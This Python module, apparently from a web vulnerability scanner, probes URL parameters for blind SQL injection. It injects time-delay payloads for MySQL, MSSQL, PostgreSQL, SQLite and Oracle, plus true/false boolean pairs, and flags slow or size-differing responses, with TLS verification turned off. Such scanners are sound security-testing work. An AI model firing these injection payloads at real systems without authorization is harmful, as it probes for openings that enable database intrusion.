"""
blind_sqli.py - Time-based and boolean-based blind SQL injection detection.
"""
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, urlencode, urlunparse
from modules.explain import get_explanation
from utils.logger import get_logger

log = get_logger(__name__)

# Time-based payloads — each should cause ~3s delay if vulnerable
TIME_PAYLOADS = [
    ("MySQL",    "' AND SLEEP(3)-- -"),
    ("MSSQL",    "'; WAITFOR DELAY '0:0:3'-- -"),
    ("PostgreSQL","'; SELECT pg_sleep(3)-- -"),
    ("SQLite",   "' AND randomblob(500000000/1)-- -"),
    ("Oracle",   "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)-- -"),
]

# Boolean payloads — (true_condition, false_condition)
BOOL_PAYLOADS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' OR 'a'='a",   "' OR 'a'='b"),
]

TIME_THRESHOLD = 2.5   # seconds — flag if response takes longer than this
BOOL_DIFF_THRESHOLD = 50  # bytes — flag if true/false responses differ by this much


def probe_blind_sqli(endpoints, requester, limiter=None, explain=False):
    """
    Test each endpoint parameter for blind SQLi.
    Returns a list of issue dicts.
    """
    results = []

    for ep in endpoints:
        if not ep.get("params"):
            continue
        url = ep["url"]

        for param in ep["params"]:
            if limiter:
                limiter.wait()

            # Time-based
            for db_label, payload in TIME_PAYLOADS:
                issue = _time_test(url, ep["params"], param, payload, db_label, requester, explain)
                if issue:
                    results.append(issue)
                    break  # one confirmed finding per param is enough

            # Boolean-based
            for true_p, false_p in BOOL_PAYLOADS:
                issue = _bool_test(url, ep["params"], param, true_p, false_p, requester, explain)
                if issue:
                    results.append(issue)
                    break

    return results


def _inject_url(url, params, param, payload):
    injected = dict(params)
    injected[param] = payload
    parsed = urlparse(url)
    return urlunparse(parsed._replace(query=urlencode(injected)))


def _time_test(url, params, param, payload, db_label, req, explain):
    target_url = _inject_url(url, params, param, payload)
    try:
        start = time.monotonic()
        req._session.get(target_url, timeout=15, verify=False, allow_redirects=False)
        elapsed = time.monotonic() - start
    except Exception:
        return None

    if elapsed >= TIME_THRESHOLD:
        issue = {
            "type": "Blind SQLi (Time-Based)",
            "endpoint": url,
            "param": param,
            "payload": payload,
            "risk": "High",
            "detail": f"{db_label} — response delayed {elapsed:.1f}s",
            "confidence": "Medium",
        }
        if explain:
            issue["reason"] = get_explanation("blind_sqli_time")
        log.debug(f"Time-based SQLi: {url} param={param} delay={elapsed:.1f}s")
        return issue
    return None


def _bool_test(url, params, param, true_payload, false_payload, req, explain):
    try:
        r_true  = req._session.get(_inject_url(url, params, param, true_payload),
                                   timeout=10, verify=False, allow_redirects=False)
        r_false = req._session.get(_inject_url(url, params, param, false_payload),
                                   timeout=10, verify=False, allow_redirects=False)
    except Exception:
        return None

    len_diff = abs(len(r_true.content) - len(r_false.content))
    if len_diff >= BOOL_DIFF_THRESHOLD and r_true.status_code == r_false.status_code:
        issue = {
            "type": "Blind SQLi (Boolean-Based)",
            "endpoint": url,
            "param": param,
            "payload": f"true: {true_payload}  /  false: {false_payload}",
            "risk": "High",
            "detail": f"Response size diff: {len_diff} bytes",
            "confidence": "Low",  # needs manual verification
        }
        if explain:
            issue["reason"] = get_explanation("blind_sqli_bool")
        log.debug(f"Boolean SQLi candidate: {url} param={param} diff={len_diff}b")
        return issue
    return None
